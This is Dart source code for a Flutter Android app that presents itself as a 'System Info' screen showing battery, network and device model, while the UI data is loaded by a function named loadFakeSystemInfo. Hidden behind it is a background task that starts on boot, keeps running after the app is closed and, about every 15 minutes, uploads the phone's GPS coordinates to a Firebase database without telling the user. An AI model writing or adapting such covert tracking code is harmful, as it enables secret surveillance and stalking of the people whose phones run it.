import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:geolocator/geolocator.dart';
import 'package:background_fetch/background_fetch.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';

late DatabaseReference db;
late String deviceId;

void backgroundFetchHeadlessTask(HeadlessTask task) async {
  await Firebase.initializeApp();
  Position pos = await Geolocator.getCurrentPosition();
  db = FirebaseDatabase.instance.ref();
  await db.child("locations/$deviceId").set({
    "lat": pos.latitude,
    "lng": pos.longitude,
    "timestamp": DateTime.now().millisecondsSinceEpoch
  });
  BackgroundFetch.finish(task.taskId);
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  deviceId = "device-${DateTime.now().millisecondsSinceEpoch}";
  BackgroundFetch.registerHeadlessTask(backgroundFetchHeadlessTask);
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  String batteryLevel = "Loading...";
  String deviceName = "Unknown";
  String networkStatus = "Checking...";

  @override
  void initState() {
    super.initState();
    initBackgroundFetch();
    loadFakeSystemInfo();
  }

  void initBackgroundFetch() async {
    await BackgroundFetch.configure(
      BackgroundFetchConfig(
        minimumFetchInterval: 15,
        stopOnTerminate: false,
        enableHeadless: true,
        startOnBoot: true,
      ),
      (taskId) async {
        Position pos = await Geolocator.getCurrentPosition();
        await FirebaseDatabase.instance.ref("locations/$deviceId").set({
          "lat": pos.latitude,
          "lng": pos.longitude,
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
        BackgroundFetch.finish(taskId);
      },
      (taskId) async {
        BackgroundFetch.finish(taskId);
      },
    );
    BackgroundFetch.start();
  }

  void loadFakeSystemInfo() async {
    final battery = Battery();
    final info = DeviceInfoPlugin();
    final androidInfo = await info.androidInfo;
    final connectivity = await Connectivity().checkConnectivity();

    setState(() {
      deviceName = androidInfo.model ?? "Android Device";
      networkStatus = connectivity == ConnectivityResult.wifi
          ? "Wi-Fi"
          : connectivity == ConnectivityResult.mobile
              ? "Mobile Data"
              : "Offline";
    });

    battery.batteryLevel.then((level) {
      setState(() {
        batteryLevel = "$level%";
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Info',
      home: Scaffold(
        appBar: AppBar(title: Text("System Info")),
        body: Padding(
          padding: const EdgeInsets.all(20.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text("üì± Device Name: $deviceName", style: TextStyle(fontSize: 18)),
              SizedBox(height: 10),
              Text("üîã Battery Level: $batteryLevel", style: TextStyle(fontSize: 18)),
              SizedBox(height: 10),
              Text("üåê Network: $networkStatus", style: TextStyle(fontSize: 18)),
              SizedBox(height: 10),
              Text("‚úÖ Status: All systems operational", style: TextStyle(fontSize: 18)),
            ],
          ),
        ),
      ),
    );
  }
}